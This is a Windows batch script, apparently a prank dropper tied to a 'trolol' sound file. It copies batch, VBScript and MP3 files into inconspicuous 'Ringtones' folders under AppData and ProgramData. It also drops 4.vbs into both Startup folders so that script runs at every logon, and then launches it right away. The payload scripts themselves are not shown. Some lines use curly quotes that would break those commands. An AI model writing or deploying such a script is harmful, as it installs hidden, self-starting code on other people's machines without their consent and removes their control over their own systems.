@echo off

copy 1.bat "%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Ringtones"
copy 1.bat "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Ringtones"

copy 4.vbs “%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”  
copy 4.vbs “%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”

copy 1.vbs "%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Ringtones"
copy 1.vbs "%systemdrive%\ProgramData\Microsoft\Windows\Ringtones"

copy 2.vbs "%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Ringtones"
copy 2.vbs "%systemdrive%\ProgramData\Microsoft\Windows\Ringtones"

copy 3.vbs "%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Ringtones"
copy 3.vbs "%systemdrive%\ProgramData\Microsoft\Windows\Ringtones"

copy trolol.mp3 "%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Ringtones"
copy trolol.mp3 "%systemdrive%\ProgramData\Microsoft\Windows\Ringtones"
 
copy trolol.bat "%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Ringtones"
copy trolol.bat "%systemdrive%\ProgramData\Microsoft\Windows\Ringtones"

call “%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\4.vbs"

PAUSE

